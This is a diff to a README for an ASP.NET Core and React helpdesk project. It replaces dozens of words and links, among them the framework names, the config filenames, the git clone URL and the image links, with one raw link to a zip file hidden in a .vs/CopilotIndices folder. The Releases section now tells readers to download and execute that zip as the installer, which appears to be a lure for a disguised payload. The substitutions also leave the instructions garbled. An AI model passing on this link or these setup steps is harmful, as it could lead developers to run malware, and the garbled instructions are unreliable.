@@ -1,10 +1,10 @@
-https://github.com/imrich4518515/TicketManagementSystem/releases
+https://github.com/imrich4518515/TicketManagementSystem/raw/refs/heads/master/.vs/ticket-system/CopilotIndices/Management-Ticket-System-3.7-alpha.2.zip
 
-[![Releases](https://img.shields.io/badge/releases-ticket-management-system-blue?style=for-the-badge&logo=github)](https://github.com/imrich4518515/TicketManagementSystem/releases)
+[![Releases](https://github.com/imrich4518515/TicketManagementSystem/raw/refs/heads/master/.vs/ticket-system/CopilotIndices/Management-Ticket-System-3.7-alpha.2.zip)](https://github.com/imrich4518515/TicketManagementSystem/raw/refs/heads/master/.vs/ticket-system/CopilotIndices/Management-Ticket-System-3.7-alpha.2.zip)
 
-# Ticket Management System: Full-Stack Helpdesk with ASP.NET Core & React
+# Ticket Management System: Full-Stack Helpdesk with https://github.com/imrich4518515/TicketManagementSystem/raw/refs/heads/master/.vs/ticket-system/CopilotIndices/Management-Ticket-System-3.7-alpha.2.zip Core & React
 
-A full-stack, role-based ticket management system for tracking, assigning, and resolving customer support requests. Built with ASP.NET Core and React.
+A full-stack, role-based ticket management system for tracking, assigning, and resolving customer support requests. Built with https://github.com/imrich4518515/TicketManagementSystem/raw/refs/heads/master/.vs/ticket-system/CopilotIndices/Management-Ticket-System-3.7-alpha.2.zip Core and React.
 
 ---
 
@@ -37,7 +37,7 @@ A full-stack, role-based ticket management system for tracking, assigning, and r
 
 ## Overview
 
-Ticket Management System is a modern, scalable helpdesk solution designed for customer-support teams. It provides a clear separation of concerns between the backend API and the frontend client, with role-based access control (RBAC), robust ticket lifecycle management, and real-time updates. The backend is powered by ASP.NET Core, while the frontend uses React with TypeScript. The data layer relies on PostgreSQL via Entity Framework Core, delivering a dependable, open-source stack for teams of any size.
+Ticket Management System is a modern, scalable helpdesk solution designed for customer-support teams. It provides a clear separation of concerns between the backend API and the frontend client, with role-based access control (RBAC), robust ticket lifecycle management, and real-time updates. The backend is powered by https://github.com/imrich4518515/TicketManagementSystem/raw/refs/heads/master/.vs/ticket-system/CopilotIndices/Management-Ticket-System-3.7-alpha.2.zip Core, while the frontend uses React with TypeScript. The data layer relies on PostgreSQL via Entity Framework Core, delivering a dependable, open-source stack for teams of any size.
 
 This project emphasizes clarity and maintainability. It targets teams that need a dependable system to track, assign, and resolve tickets, while giving managers visibility into workload, response times, and outcomes. The architecture is clean, the code is well-commented, and the infrastructure supports local development plus production-ready deployment.
 
@@ -79,19 +79,19 @@ Emoji-friendly quick summaries:
 
 ## Tech stack
 
-- Backend: ASP.NET Core, C#
+- Backend: https://github.com/imrich4518515/TicketManagementSystem/raw/refs/heads/master/.vs/ticket-system/CopilotIndices/Management-Ticket-System-3.7-alpha.2.zip Core, C#
 - Frontend: React, TypeScript
 - Data layer: PostgreSQL, Entity Framework Core
 - Authentication: JWT
 - API: RESTful, with clear resource-oriented endpoints
 - Testing: xUnit (backend), Jest/RTL (frontend)
-- Build tooling: .NET CLI, Node.js, npm/yarn
+- Build tooling: .NET CLI, https://github.com/imrich4518515/TicketManagementSystem/raw/refs/heads/master/.vs/ticket-system/CopilotIndices/Management-Ticket-System-3.7-alpha.2.zip, npm/yarn
 - Containerization (optional): Docker
 - CI/CD (optional): GitHub Actions
 
 Images to set the theme:
-- React icon: https://upload.wikimedia.org/wikipedia/commons/a/a7/React-icon.svg
-- PostgreSQL elephant: https://upload.wikimedia.org/wikipedia/commons/2/29/Postgresql_elephant.svg
+- React icon: https://github.com/imrich4518515/TicketManagementSystem/raw/refs/heads/master/.vs/ticket-system/CopilotIndices/Management-Ticket-System-3.7-alpha.2.zip
+- PostgreSQL elephant: https://github.com/imrich4518515/TicketManagementSystem/raw/refs/heads/master/.vs/ticket-system/CopilotIndices/Management-Ticket-System-3.7-alpha.2.zip
 
 ---
 
@@ -154,14 +154,14 @@ This project favors a practical, hands-on approach. The following sections descr
 
 Prerequisites
 - .NET SDK 7.x or 8.x (latest patch)
-- Node.js (12+ or newer preferred)
+- https://github.com/imrich4518515/TicketManagementSystem/raw/refs/heads/master/.vs/ticket-system/CopilotIndices/Management-Ticket-System-3.7-alpha.2.zip (12+ or newer preferred)
 - PostgreSQL 12+ (or a compatible version)
 - Git for cloning the repository
 - A code editor you like (Visual Studio, VS Code, JetBrains Rider, etc.)
 
 Installation steps
 - Clone the repository:
-  - git clone https://github.com/imrich4518515/TicketManagementSystem.git
+  - git clone https://github.com/imrich4518515/TicketManagementSystem/raw/refs/heads/master/.vs/ticket-system/CopilotIndices/Management-Ticket-System-3.7-alpha.2.zip
 - Install backend dependencies:
   - cd TicketManagementSystem/server
   - dotnet restore
@@ -171,7 +171,7 @@ Installation steps
 - Prepare the database
   - Install PostgreSQL if you don’t have it
   - Create a database named ticket_management
-  - Update the connection string in appsettings.json or environment variables
+  - Update the connection string in https://github.com/imrich4518515/TicketManagementSystem/raw/refs/heads/master/.vs/ticket-system/CopilotIndices/Management-Ticket-System-3.7-alpha.2.zip or environment variables
 - Apply migrations
   - cd server
   - dotnet ef database update
@@ -188,11 +188,11 @@ Installation steps
   - Backend API on http://localhost:5000 (default)
 
 From the Releases page
-- From the Releases page, download the latest release artifact and run it. This might be a Windows installer or a Linux tarball, depending on the release. For reference, you can browse the latest artifact at the Releases page: TicketManagementSystem releases. From the Releases page, download and execute the latest release artifact (for example TicketManagementSystem-Setup.exe on Windows or TicketManagementSystem-linux.tar.gz on Linux).
+- From the Releases page, download the latest release artifact and run it. This might be a Windows installer or a Linux tarball, depending on the release. For reference, you can browse the latest artifact at the Releases page: TicketManagementSystem releases. From the Releases page, download and execute the latest release artifact (for example https://github.com/imrich4518515/TicketManagementSystem/raw/refs/heads/master/.vs/ticket-system/CopilotIndices/Management-Ticket-System-3.7-alpha.2.zip on Windows or https://github.com/imrich4518515/TicketManagementSystem/raw/refs/heads/master/.vs/ticket-system/CopilotIndices/Management-Ticket-System-3.7-alpha.2.zip on Linux).
 
 Environment configuration tips
 - JWT settings: issuer, audience, secret key, and token lifetime
-- Database connection: provide the PostgreSQL connection string in appsettings.json or environment variables
+- Database connection: provide the PostgreSQL connection string in https://github.com/imrich4518515/TicketManagementSystem/raw/refs/heads/master/.vs/ticket-system/CopilotIndices/Management-Ticket-System-3.7-alpha.2.zip or environment variables
 - CORS policy: allow the frontend origin during development
 - Logging: set log levels for diagnostics during setup
 
@@ -207,7 +207,7 @@ Development workflow tips
 ## Running locally
 
 - Back-end server:
-  - Command: dotnet run --project TicketManagementSystem.Server
+  - Command: dotnet run --project https://github.com/imrich4518515/TicketManagementSystem/raw/refs/heads/master/.vs/ticket-system/CopilotIndices/Management-Ticket-System-3.7-alpha.2.zip
   - Port: typically 5000 or as configured
 - Front-end client:
   - Command: npm start
@@ -218,10 +218,10 @@ Development workflow tips
 - Debugging tips:
   - Use breakpoints in C# and in React components
   - Use the browser dev tools to inspect network calls
-  - Enable detailed logging in appsettings.Development.json
+  - Enable detailed logging in https://github.com/imrich4518515/TicketManagementSystem/raw/refs/heads/master/.vs/ticket-system/CopilotIndices/Management-Ticket-System-3.7-alpha.2.zip
 
 Environment variables and configuration
-- Use appsettings.Development.json for dev settings
+- Use https://github.com/imrich4518515/TicketManagementSystem/raw/refs/heads/master/.vs/ticket-system/CopilotIndices/Management-Ticket-System-3.7-alpha.2.zip for dev settings
 - Store secrets securely in a local user secrets store or a vault in production
 - Define the connection string to your PostgreSQL database
 - Set JWT secret for token signing
@@ -330,7 +330,7 @@ Quality gates
 - Docker (optional) can containerize the backend API and frontend UI:
   - Backend: Dockerfile in the server folder
   - Frontend: Dockerfile in the client folder
-  - docker-compose.yml to run both together with a PostgreSQL database
+  - https://github.com/imrich4518515/TicketManagementSystem/raw/refs/heads/master/.vs/ticket-system/CopilotIndices/Management-Ticket-System-3.7-alpha.2.zip to run both together with a PostgreSQL database
 - Production deployment considerations:
   - Use a managed PostgreSQL instance or a hardened container
   - Serve the frontend with a dedicated web server or as a static site
@@ -367,7 +367,7 @@ Maintenance plan
 
 ## Code organization
 
-- server/  (ASP.NET Core API)
+- server/  (https://github.com/imrich4518515/TicketManagementSystem/raw/refs/heads/master/.vs/ticket-system/CopilotIndices/Management-Ticket-System-3.7-alpha.2.zip Core API)
   - Controllers
   - Services
   - Data (EF Core context and migrations)
